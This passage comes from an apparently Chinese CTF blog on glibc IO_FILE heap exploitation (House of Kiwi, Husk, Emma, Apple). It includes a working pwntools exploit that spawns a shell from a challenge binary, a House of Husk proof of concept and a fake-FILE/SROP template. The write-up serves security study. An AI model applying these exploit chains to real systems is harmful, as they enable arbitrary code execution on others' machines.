class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.31/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,<span class="hljs-built_in">id</span>,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;How much do you want?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Which one do you want to put?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Tell me your idea:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to remove?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to look?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to change?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Change your idea:&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    menu(<span class="hljs-number">666</span>)<br><br><span class="hljs-comment"># flag_addr = heap_base + 0x2a0</span><br>sla(<span class="hljs-string">&#x27;Before the game starts, please give me your name:\n&#x27;</span>,<span class="hljs-string">&#x27;./flag\0&#x27;</span>)<br><br><span class="hljs-comment"># Easy Heap Fengshui</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">1</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">3</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">4</span>) <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">5</span>) <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">6</span>) <span class="hljs-comment"># 6</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>) <span class="hljs-comment"># 7</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>) <span class="hljs-comment"># 8</span><br><br><span class="hljs-comment"># chunk1 -&gt; size = 0x40</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x41&#x27;</span>)<br>dele(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x38</span>,<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># chunk2 -&gt; size = 0x460 Create a unsortedbin</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x20</span> + <span class="hljs-number">0x110</span>*<span class="hljs-number">4</span> + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>dele(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Leak libc</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1ebf75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>__sync = libc.sym._IO_file_jumps + <span class="hljs-number">0x60</span><br>_IO_helper_jumps = libc_base + <span class="hljs-number">0x1ec8a0</span><br><br><span class="hljs-comment"># Tcache Poisoning1 _IO_file_jumps -&gt; __sync = system</span><br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(__sync) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>,p64(libc.sym.system))<br><br><span class="hljs-comment"># Tcache Poisoning2 _IO_2_1_stderr_ -&gt; _flags = &#x27;/bin/sh\0&#x27;</span><br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(libc.sym._IO_2_1_stderr_) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br><br><span class="hljs-comment"># Tcache Poisoning3 main_arena -&gt; top = &amp;main_arena - 0x10 </span><br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(libc_base + <span class="hljs-number">0x1ebbe0</span>) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>,p64(libc_base + <span class="hljs-number">0x1ebbe0</span> - <span class="hljs-number">96</span> - <span class="hljs-number">16</span>)*<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Trigger kiwi ~~</span><br>gift()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">In file: /home/caffe1ne/Exps/Glibc/glibc<span class="hljs-number">-2.31</span>/libio/iofflush.c<br>   <span class="hljs-number">34</span>     <span class="hljs-keyword">return</span> _IO_flush_all ();<br>   <span class="hljs-number">35</span>   <span class="hljs-keyword">else</span><br>   <span class="hljs-number">36</span>     &#123;<br>   <span class="hljs-number">37</span>       <span class="hljs-type">int</span> result;<br>   <span class="hljs-number">38</span>       CHECK_FILE (fp, EOF);<br> ► <span class="hljs-number">39</span>       _IO_acquire_lock (fp);<br>   <span class="hljs-number">40</span>       result = _IO_SYNC (fp) ? EOF : <span class="hljs-number">0</span>;<br>   <span class="hljs-number">41</span>       _IO_release_lock (fp);<br>   <span class="hljs-number">42</span>       <span class="hljs-keyword">return</span> result;<br>   <span class="hljs-number">43</span>     &#125;<br>   <span class="hljs-number">44</span> &#125;<br></code></pre></td></tr></table></figure><p>在运行 <strong>_IO_SYNC (fp)</strong> 时运行的就是 <code>system('/bin/sh')</code> 。</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526182847525.png" alt="image-20220526182847525" style="zoom:67%;" /><hr><h3 id="House-of-Husk"><a class="header-anchor" href="#House-of-Husk">¶</a>House of Husk</h3><p>这条利用路线比较简单，条件是俩次任意写或者俩次 Largebin Attack。</p><h4 id="原理-v2"><a class="header-anchor" href="#原理-v2">¶</a>原理</h4><p><strong>printf_positional</strong> 的 <strong>printf-parsemb</strong> 函数中对处理各种格式化字符串的标识符( <code>%p</code>,<code>%X</code> 等)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Get the format specification.  */</span><br>spec-&gt;info.spec = (<span class="hljs-type">wchar_t</span>) *format++;<br>spec-&gt;size = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">if</span> (__builtin_expect (__printf_function_table == <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>)<br>    || spec-&gt;info.spec &gt; UCHAR_MAX<br>    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="hljs-literal">NULL</span><br>    <span class="hljs-comment">/* We don&#x27;t try to get the types for all arguments if the format</span><br><span class="hljs-comment">uses more than one.  The normal case is covered though.  If</span><br><span class="hljs-comment">the call returns -1 we continue with the normal specifiers.  */</span><br>    || (<span class="hljs-type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])<br>   (&amp;spec-&gt;info, <span class="hljs-number">1</span>, &amp;spec-&gt;data_arg_type,<br>    &amp;spec-&gt;size)) &lt; <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>当 <code>__printf_function_table != NULL</code> 并且 <code>__printf_arginfo_table[sepc] != NULL</code> 时，会调用 <code>__printf_function_table[(size_t) spec]</code> 处的函数。</p><p>指定标识符偏移计算，以 ‘X’ 为例：<br>$$<br>(ord(char) -2)*8\<br>(ord(‘X’)-2)<em>8=86</em>8=688=0x2b0<br>$$<br>相应的我们得到最常用到的 <code>%s</code> 偏移为 <strong>0x388</strong> 。</p><p>注意这里 <strong>-2</strong> 是因为从内存区域<strong>而不是chunk头</strong>计算，从 chunk 头部计算就不要减二了。例如 <code>%s</code> 为 $ord(‘s’)*8=0x398$ ，👴 就是被这玩意坑了，不希望大 🔥 也上当受骗。</p><h4 id="使用场景-v2"><a class="header-anchor" href="#使用场景-v2">¶</a>使用场景</h4><p>能控制 <strong>__printf_arginfo_table,__printf_function_table</strong> 为堆地址，以在制定偏移处写我们的目标函数，这俩张表都能写函数，调用位置不同。</p><p><strong>one_gadget</strong> 起效时，<strong>husk</strong> 有奇效，非常好用。不起效或开了沙箱时，可以在函数表写 <strong>exit</strong> 进入 exit 流程，配合其他高版本 house 使用。</p><h4 id="Demo-v3"><a class="header-anchor" href="#Demo-v3">¶</a>Demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ptr-yudai/House-of-Husk/blob/master/poc-husk.c</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Husk&#x27;s method - House of Husk</span><br><span class="hljs-comment"> * This PoC is supposed to be run with libc-2.27</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAIN_ARENA       0x3ebc40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAIN_ARENA_DELTA 0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINTF_FUNCTABLE 0x3f0658</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINTF_ARGINFO   0x3ec870</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ONE_GADGET       0x10a38c</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> libc_base;<br>  <span class="hljs-type">char</span> *a[<span class="hljs-number">10</span>];<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// make printf quiet</span><br><br>  <span class="hljs-comment">/* leak libc */</span><br>  a[<span class="hljs-number">0</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* UAF chunk */</span><br>  a[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));<br>  a[<span class="hljs-number">2</span>] = <span class="hljs-built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));<br>  a[<span class="hljs-number">3</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* avoid consolidation */</span><br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">0</span>]);<br>  libc_base = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)a[<span class="hljs-number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);<br><br>  <span class="hljs-comment">/* prepare fake printf arginfo table */</span><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)(a[<span class="hljs-number">2</span>] + (<span class="hljs-string">&#x27;X&#x27;</span> - <span class="hljs-number">2</span>) * <span class="hljs-number">8</span>) = libc_base + ONE_GADGET;<br><br>  <span class="hljs-comment">/* unsorted bin attack */</span><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)(a[<span class="hljs-number">0</span>] + <span class="hljs-number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="hljs-number">0x10</span>;<br>  a[<span class="hljs-number">0</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* overwrite global_max_fast */</span><br><br>  <span class="hljs-comment">/* overwrite __printf_arginfo_table */</span><br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">1</span>]);<br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-comment">/* ignite! */</span><br>  getchar();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%X&quot;</span>, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="House-of-Emma"><a class="header-anchor" href="#House-of-Emma">¶</a>House of Emma</h3><p>2.24 以后，glibc 加入了对 IOFILE 结构体的 vtable 是否在指定区间的检测。自 2.27 的高版本起，我们常用的俩个函数(_IO_str_overflow 与 _IO_str_finish)中的函数指针也被替换成了 malloc 和 free。于是我们把目光转移到合法区间内的可利用函数。</p><h4 id="使用场景-v3"><a class="header-anchor" href="#使用场景-v3">¶</a>使用场景</h4><ol><li>可以任意写一个可控地址（LargeBin Attack、Tcache Stashing Unlink Attack…）</li><li>可以触发 IO 流（FSOP、<a href="https://www.anquanke.com/post/id/235598">House OF Kiwi</a>）</li></ol><h4 id="原理-v3"><a class="header-anchor" href="#原理-v3">¶</a>原理</h4><p>在 vtable 的合法范围内，存在一个 _IO_cookie_jumps ， _IO_cookie_jumps 中存在下列函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br>_IO_cookie_read (FILE *fp, <span class="hljs-type">void</span> *buf, <span class="hljs-type">ssize_t</span> size)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span> *<span class="hljs-title">cfile</span> =</span> (<span class="hljs-keyword">struct</span> _IO_cookie_file *) fp;<br>  <span class="hljs-type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (read_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (read_cb == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br>_IO_cookie_write (FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">ssize_t</span> size)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span> *<span class="hljs-title">cfile</span> =</span> (<span class="hljs-keyword">struct</span> _IO_cookie_file *) fp;<br>  <span class="hljs-type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (write_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (write_cb == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>  <span class="hljs-type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);<br>  <span class="hljs-keyword">if</span> (n &lt; size)<br>    fp-&gt;_flags |= _IO_ERR_SEEN;<br><br>  <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里调用的函数指针 <code>read_cb</code> 和 <code>write_cb</code> 和 2.27 版本的利用一样，都是以 IOFILE 结构体为基寻址的，我们可以轻易的控制这些函数指针。</p><p>可惜的是，并没有 2.27 版本那么简单，如上代码中存在以下保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (write_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>总所周知，glibc 里面的宏都是比较抽象的，这个地方最好还是结合调试来看：</p><p>看不到就是还在咕。</p><hr><h3 id="House-of-Apple"><a class="header-anchor" href="#House-of-Apple">¶</a>House of Apple</h3><p>其实有了 apple 之后，其他的反而显得没那么重要了，暂时 IOFILE 系列就搁置在这了，以后再更~ 还是先放个模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">_IO_wfile_jumps = libc_base + <span class="hljs-number">0x2160c0</span><br>target_chunk = heap_base + <span class="hljs-number">0xcf0</span><br>addr = target_chunk + <span class="hljs-number">0x200</span><br>fake_frame = SigreturnFrame()<br>fake_frame.rdi = <span class="hljs-number">0</span><br>fake_frame.rsi = addr<br>fake_frame.rdx = <span class="hljs-number">0x300</span><br>fake_frame.rsp = addr<br>fake_frame.rip = libc.sym.read<br>fake_io = <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>fake_io = fake_io.ljust(<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_io += p64(target_chunk+<span class="hljs-number">0x30</span>)<br>fake_io = fake_io.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_io += p64(target_chunk+<span class="hljs-number">0xd0</span>)   <span class="hljs-comment"># RDX</span><br>fake_io = fake_io.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_io += p64(_IO_wfile_jumps)<br>fake_io += <span class="hljs-built_in">str</span>(fake_frame)[:<span class="hljs-number">0xe0</span>]<br>fake_io += p64(target_chunk+<span class="hljs-number">0xd0</span>+<span class="hljs-number">0xe0</span>+<span class="hljs-number">8</span>-<span class="hljs-number">0x68</span>) + p64(magic)<br>edit(<span class="hljs-number">2</span>,fake_io[<span class="hljs-number">0x10</span>:])<br>menu(<span class="hljs-number">0</span>)<br>rop_chain = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>sleep(<span class="hljs-number">1</span>)<br>sl(rop_chain)<br></code></pre></td></tr></table></figure><hr><h2 id="stdin-任意写"><a class="header-anchor" href="#stdin-任意写">¶</a>stdin 任意写</h2><p><strong>注意</strong>：<code>scanf</code>，<code>fread</code>，<code>gets</code>等读入走<code>IO</code>指针（<code>read</code>不走）。<br><strong>大体流程</strong>为：若<code>_IO_buf_base</code>为空，则调用<code>_IO_doallocbuf</code>去初始化输入缓冲区，然后判断输入缓冲区是否存在剩余数据，如果输入缓冲区有剩余数据（<code>_IO_read_end &gt; _IO_read_ptr</code>）则将其<strong>直接拷贝至目标地址</strong>（不会对此时输入的数据进行读入），如果没有或不够，则调用<code>__underflow</code>函数<strong>执行系统调用读取数据</strong>（<code>SYS_read</code>）到输入缓冲区（从<code>_IO_buf_base</code>到<code>_IO_buf_end</code>，默认<code>0x400</code>，即将数据读到<code>_IO_buf_base</code>，读取<code>0x400</code>个字节），此时若实际读入了<code>n</code>个字节的数据，则<code>_IO_read_end = _IO_buf_base + 